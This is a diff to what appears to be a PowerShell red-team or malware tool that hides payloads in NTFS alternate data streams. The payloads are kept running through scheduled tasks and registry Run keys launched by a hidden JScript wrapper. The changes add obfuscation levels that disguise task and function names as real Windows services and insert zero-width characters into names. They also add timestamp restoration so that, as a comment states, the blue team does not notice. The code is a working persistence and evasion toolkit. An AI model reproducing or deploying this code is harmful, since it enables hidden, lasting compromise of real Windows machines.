@@ -145,6 +145,11 @@ param(
 
     [switch]$Randomize,
     [switch]$Encrypt,
+
+    # Unified obfuscation level — controls naming, placement, and ZW injection
+    [ValidateSet('None', 'Basic', 'Advanced', 'Paranoid')]
+    [string]$Obfuscate = 'Advanced',
+
     [switch]$ZeroWidthStreams,
     
     [ValidateSet('single', 'multi', 'hybrid')]
@@ -289,6 +294,20 @@ if ($Help -or $args -contains '-h' -or $args -contains '--help' -or
 
 # Main Execution Logic Begins
 
+# --- Tier-implied defaults (individual params override) ---
+if ($Obfuscate -in @('Advanced', 'Paranoid')) {
+    if (-not $PSBoundParameters.ContainsKey('UseDeepPlacement')) { $UseDeepPlacement = $true }
+    if (-not $PSBoundParameters.ContainsKey('AttachToExisting')) { $AttachToExisting = $true }
+    if (-not $PSBoundParameters.ContainsKey('Randomize')) { $Randomize = [switch]::new($true) }
+}
+if ($Obfuscate -eq 'Paranoid') {
+    if (-not $PSBoundParameters.ContainsKey('ZeroWidthStreams')) { $ZeroWidthStreams = [switch]::new($true) }
+}
+# Backward compat: -ZeroWidthStreams without explicit -Obfuscate upgrades to Paranoid
+if ($ZeroWidthStreams -and -not $PSBoundParameters.ContainsKey('Obfuscate')) {
+    $Obfuscate = 'Paranoid'
+}
+
 #region Zero-Width Unicode Functions
 
 # Verified zero-width Unicode codepoints
@@ -400,6 +419,113 @@ function ConvertFrom-Codepoints {
     } catch {
         Write-Error "Failed to reconstruct from codepoints: $_"
         return $null
+    }
+}
+
+#endregion
+
+#region Obfuscation Functions
+
+# Word lists for legitimate-looking names (sourced from real Windows task/service names)
+$script:ObfTaskNames = @(
+    'WindowsDefenderScheduledScan', 'DiskCleanupTask', 'MemoryDiagnosticScheduler',
+    'NetworkListServiceUpdate', 'BackgroundIntelligentTransfer', 'TPMMaintenanceTask',
+    'CryptSvcBackup', 'LanguageComponentsInstaller', 'SpeechModelDownload',
+    'DeviceRegistrationTask', 'SystemSoundsService', 'WiredAutoConfig'
+)
+$script:ObfFunctionVerbs = @(
+    'Initialize', 'Sync', 'Update', 'Register', 'Enable',
+    'Process', 'Monitor', 'Optimize', 'Validate', 'Configure'
+)
+$script:ObfFunctionNouns = @(
+    'DriverCache', 'NetworkProfile', 'PolicyData', 'TelemetryLog',
+    'ComponentStatus', 'SecurityContext', 'SessionConfig', 'TpmBinding',
+    'CryptService', 'PerformanceHints'
+)
+$script:ObfCompanionSuffixes = @(
+    '-Monitor', '-Handler', '-Worker', '-Sync', '-Cache', '-Service', '-Helper', '-Manager'
+)
+
+function Get-ObfuscatedName {
+    <#
+    .SYNOPSIS
+        Central name generator for all obfuscated artifact names.
+    .DESCRIPTION
+        Returns appropriate names based on artifact type and obfuscation level.
+        None = current hardcoded values (backward compat).
+        Basic = static legitimate-looking name.
+        Advanced = random from word-list (unique per deployment).
+        Paranoid = Advanced + zero-width char injection (except function names).
+    #>
+    [CmdletBinding()]
+    [OutputType([string])]
+    param(
+        [Parameter(Mandatory)]
+        [ValidateSet('FunctionGHK', 'FunctionDec', 'TaskName', 'TaskSuffix', 'RegistryValueName')]
+        [string]$Type,
+
+        [Parameter(Mandatory)]
+        [ValidateSet('None', 'Basic', 'Advanced', 'Paranoid')]
+        [string]$Level
+    )
+
+    # Helper: inject a zero-width char at a random interior position
+    function Add-ZeroWidthChar([string]$Name) {
+        if ($Name.Length -lt 3) { return $Name }
+        $pos = Get-Random -Minimum 1 -Maximum ($Name.Length - 1)
+        $zwChar = [char]($script:ZeroWidthChars | Get-Random)
+        return $Name.Insert($pos, $zwChar)
+    }
+
+    switch ($Type) {
+        'FunctionGHK' {
+            switch ($Level) {
+                'None'     { return 'GHK' }
+                'Basic'    { return 'Get-HostKey' }
+                # ZW chars break PS parser in function names — Advanced for Paranoid too
+                default {
+                    $verb = $script:ObfFunctionVerbs | Get-Random
+                    $noun = $script:ObfFunctionNouns | Get-Random
+                    return "$verb-$noun"
+                }
+            }
+        }
+        'FunctionDec' {
+            switch ($Level) {
+                'None'     { return 'Dec' }
+                'Basic'    { return 'Unprotect-Data' }
+                default {
+                    $verb = $script:ObfFunctionVerbs | Get-Random
+                    $noun = $script:ObfFunctionNouns | Get-Random
+                    return "$verb-$noun"
+                }
+            }
+        }
+        'TaskName' {
+            switch ($Level) {
+                'None'     { return 'SystemOptimization' }
+                'Basic'    { return $script:ObfTaskNames | Get-Random }
+                'Advanced' { return $script:ObfTaskNames | Get-Random }
+                'Paranoid' { return Add-ZeroWidthChar ($script:ObfTaskNames | Get-Random) }
+            }
+        }
+        'TaskSuffix' {
+            switch ($Level) {
+                'None'     { return '_Companion' }
+                'Basic'    { return $script:ObfCompanionSuffixes | Get-Random }
+                'Advanced' { return $script:ObfCompanionSuffixes | Get-Random }
+                'Paranoid' { return Add-ZeroWidthChar ($script:ObfCompanionSuffixes | Get-Random) }
+            }
+        }
+        'RegistryValueName' {
+            # Registry value name matches task name for consistency
+            # Caller should pass the same name used for TaskName
+            # This type exists for Paranoid mode ZW injection on an existing name
+            switch ($Level) {
+                'Paranoid' { return Add-ZeroWidthChar ($script:ObfTaskNames | Get-Random) }
+                default    { return Get-ObfuscatedName -Type TaskName -Level $Level }
+            }
+        }
     }
 }
 
@@ -684,6 +810,12 @@ function Write-ADSPayload {
             New-Item -Path $HostPath -ItemType File -Force | Out-Null
         }
 
+        # Save original timestamps for anti-forensics restoration
+        $originalTimestamps = $null
+        if (Test-Path $HostPath) {
+            $originalTimestamps = Get-Item $HostPath | Select-Object CreationTime, LastWriteTime, LastAccessTime
+        }
+
         # Encrypt if requested
         $finalPayload = if ($EncryptPayload) {
             $key = Get-HostDerivedKey
@@ -695,7 +827,17 @@ function Write-ADSPayload {
         # Write to ADS
         $adsPath = "$HostPath`:$StreamName"
         $finalPayload | Set-Content -Path $adsPath -Force
-        
+
+        # Restore timestamps — ADS creation modifies LastWriteTime, which
+        # creates a forensic artifact in timeline analysis. Restoring prevents
+        # blue team from noticing unexpected modification on legitimate files.
+        if ($originalTimestamps) {
+            $item = Get-Item $HostPath
+            $item.CreationTime = $originalTimestamps.CreationTime
+            $item.LastWriteTime = $originalTimestamps.LastWriteTime
+            $item.LastAccessTime = $originalTimestamps.LastAccessTime
+        }
+
         Write-Verbose "Payload written to: $adsPath"
         return $adsPath
     } catch {
@@ -743,7 +885,13 @@ function Build-JScriptWrapper {
         Full ADS path including stream, e.g. "C:\ProgramData\file.dat:stream"
 
     .PARAMETER IsEncrypted
-        Embeds Get-HostKey + Dec decryption functions inline.
+        Embeds decryption functions inline with obfuscated names.
+
+    .PARAMETER GHKName
+        Obfuscated name for the host-key derivation function (default: Get-HostKey).
+
+    .PARAMETER DecName
+        Obfuscated name for the decryption function (default: Dec).
 
     .OUTPUTS
         [string]  JScript source code, ASCII-safe.
@@ -754,7 +902,10 @@ function Build-JScriptWrapper {
         [Parameter(Mandatory)]
         [string]$ADSFullPath,
 
-        [switch]$IsEncrypted
+        [switch]$IsEncrypted,
+
+        [string]$GHKName = 'Get-HostKey',
+        [string]$DecName = 'Dec'
     )
 
     # Escape backslashes for JScript string context.
@@ -775,11 +926,11 @@ function Build-JScriptWrapper {
         $template = @'
 var shell = new ActiveXObject("WScript.Shell");
 var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
-    "function Get-HostKey{" +
+    "function __GHKNAME__{" +
         "$h=@($env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join[char]124;" +
         "[System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($h))" +
     "};" +
-    "function Dec($d,$k){" +
+    "function __DECNAME__($d,$k){" +
         "$b=[Convert]::FromBase64String($d);" +
         "$a=[Security.Cryptography.Aes]::Create();" +
         "$a.Key=$k;$a.IV=$b[0..15];" +
@@ -788,14 +939,14 @@ var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Execut
         "$p=$c.TransformFinalBlock($t,0,$t.Length);" +
         "[Text.Encoding]::UTF8.GetString($p)" +
     "};" +
-    "$k=Get-HostKey;" +
+    "$k=__GHKNAME__;" +
     "$e=Get-Content '__ADSPATH__' -Raw;" +
-    "$p=Dec $e $k;" +
+    "$p=__DECNAME__ $e $k;" +
     "IEX $p" +
     "\"";
 shell.Run(cmd, 0, false);
 '@
-        return $template.Replace('__ADSPATH__', $jsPath)
+        return $template.Replace('__ADSPATH__', $jsPath).Replace('__GHKNAME__', $GHKName).Replace('__DECNAME__', $DecName)
     }
     else {
         $template = @'
@@ -831,7 +982,10 @@ function Create-ScheduledTaskPersistence {
         [int]$PeriodicMinutes = 5,
         [int]$JitterPercent = 20,
 
-        [switch]$IsEncrypted
+        [switch]$IsEncrypted,
+
+        [string]$GHKName = 'Get-HostKey',
+        [string]$DecName = 'Dec'
     )
 
     try {
@@ -846,7 +1000,7 @@ function Create-ScheduledTaskPersistence {
 
         # --- Generate JScript wrapper ---
         $adsFullPath = "${HostPath}:${StreamName}"
-        $jsContent = Build-JScriptWrapper -ADSFullPath $adsFullPath -IsEncrypted:$IsEncrypted
+        $jsContent = Build-JScriptWrapper -ADSFullPath $adsFullPath -IsEncrypted:$IsEncrypted -GHKName $GHKName -DecName $DecName
 
         # --- Choose save location (co-locate with host file) ---
         $hostDir = Split-Path $HostPath -Parent
@@ -995,7 +1149,11 @@ function Create-RegistryPersistence {
         [int]$PeriodicMinutes = 5,
         [int]$JitterPercent = 20,
 
-        [switch]$IsEncrypted
+        [switch]$IsEncrypted,
+
+        [string]$GHKName = 'GHK',
+        [string]$DecName = 'Dec',
+        [string]$TaskSuffix = '_Companion'
     )
 
     try {
@@ -1005,12 +1163,12 @@ function Create-RegistryPersistence {
         # -W Hidden works from registry Run keys (Explorer.exe respects it)
         if ($IsEncrypted) {
             $regCmd = 'powershell.exe -NoP -W Hidden -EP Bypass -C "' +
-                'function GHK{$h=@($env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join[char]124;' +
+                "function ${GHKName}" + '{$h=@($env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join[char]124;' +
                 '[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($h))};' +
-                'function Dec($d,$k){$b=[Convert]::FromBase64String($d);$a=[Security.Cryptography.Aes]::Create();' +
+                "function ${DecName}" + '($d,$k){$b=[Convert]::FromBase64String($d);$a=[Security.Cryptography.Aes]::Create();' +
                 '$a.Key=$k;$a.IV=$b[0..15];$c=$a.CreateDecryptor();$t=$b[16..($b.Length-1)];' +
                 '$p=$c.TransformFinalBlock($t,0,$t.Length);[Text.Encoding]::UTF8.GetString($p)};' +
-                '$k=GHK;$e=gc ''' + $adsFullPath + ''' -Raw;IEX(Dec $e $k)"'
+                "`$k=${GHKName};" + '$e=gc ''' + $adsFullPath + "' -Raw;IEX(${DecName} " + '$e $k)"'
         } else {
             $regCmd = "powershell.exe -NoP -W Hidden -EP Bypass -C `"IEX(gc '$adsFullPath' -Raw)`""
         }
@@ -1059,13 +1217,9 @@ function Create-RegistryPersistence {
         # Registry Run keys only fire at logon/startup. A companion task
         # handles periodic interval, OnIdle, and OnUnlock — consistent
         # with task persistence behavior.
-        $companionTaskName = if ($Randomize) {
-            "WinSAT_" + (-join ((65..90) | Get-Random -Count 6 | ForEach-Object { [char]$_ }))
-        } else {
-            "${ValueName}_Companion"
-        }
+        $companionTaskName = "${ValueName}${TaskSuffix}"
 
-        $jsContent = Build-JScriptWrapper -ADSFullPath $adsFullPath -IsEncrypted:$IsEncrypted
+        $jsContent = Build-JScriptWrapper -ADSFullPath $adsFullPath -IsEncrypted:$IsEncrypted -GHKName $GHKName -DecName $DecName
 
         $hostDir = Split-Path $HostPath -Parent
         if (-not $hostDir -or -not (Test-Path $hostDir)) { $hostDir = $env:ProgramData }
@@ -1193,12 +1347,11 @@ if ($ZeroWidthStreams) {
     Write-Warning "Zero-width stream - Codepoints: $($config.Codepoints)"
 }
 
-# Generate task name (for both GenerateOnly and normal execution)
-$taskName = if ($Randomize) {
-    "WinSAT_" + (-join ((65..90) | Get-Random -Count 6 | ForEach-Object { [char]$_ }))
-} else {
-    "SystemOptimization"
-}
+# Generate obfuscated names (consistent across all references in this deployment)
+$taskName = Get-ObfuscatedName -Type TaskName -Level $Obfuscate
+$taskSuffix = Get-ObfuscatedName -Type TaskSuffix -Level $Obfuscate
+$ghkFuncName = Get-ObfuscatedName -Type FunctionGHK -Level $Obfuscate
+$decFuncName = Get-ObfuscatedName -Type FunctionDec -Level $Obfuscate
 
 # If GenerateOnly mode, return configuration and exit
 if ($GenerateOnly) {
@@ -1207,7 +1360,7 @@ if ($GenerateOnly) {
     $streamNameEscaped = ($streamChars | ForEach-Object {
         "[char]0x{0:X4}" -f [int]$_
     }) -join '+'
-    
+
     # Return configuration object
     return [PSCustomObject]@{
         HostPath = $config.HostPath
@@ -1215,6 +1368,9 @@ if ($GenerateOnly) {
         StreamNameEscaped = $streamNameEscaped
         Codepoints = $config.Codepoints
         TaskName = $taskName
+        TaskSuffix = $taskSuffix
+        GHKFunctionName = $ghkFuncName
+        DecFunctionName = $decFuncName
         Payload = $Payload
         PayloadEncrypted = $Encrypt.IsPresent
         PersistenceMethod = $Persist
@@ -1227,6 +1383,7 @@ if ($GenerateOnly) {
         Trigger = $Trigger
         PeriodicMinutes = $PeriodicMinutes
         JitterPercent = $JitterPercent
+        ObfuscationLevel = $Obfuscate
     }
 }
 
@@ -1258,7 +1415,9 @@ if ($Persist -ne 'none') {
                 -Trigger $Trigger `
                 -PeriodicMinutes $PeriodicMinutes `
                 -JitterPercent $JitterPercent `
-                -IsEncrypted:$Encrypt
+                -IsEncrypted:$Encrypt `
+                -GHKName $ghkFuncName `
+                -DecName $decFuncName
 
             if ($taskResult) {
                 $taskName     = $taskResult.TaskName
@@ -1277,7 +1436,10 @@ if ($Persist -ne 'none') {
                 -Trigger $Trigger `
                 -PeriodicMinutes $PeriodicMinutes `
                 -JitterPercent $JitterPercent `
-                -IsEncrypted:$Encrypt
+                -IsEncrypted:$Encrypt `
+                -GHKName $ghkFuncName `
+                -DecName $decFuncName `
+                -TaskSuffix $taskSuffix
 
             if ($regResult) {
                 foreach ($rp in $regResult.RegistryPaths) {
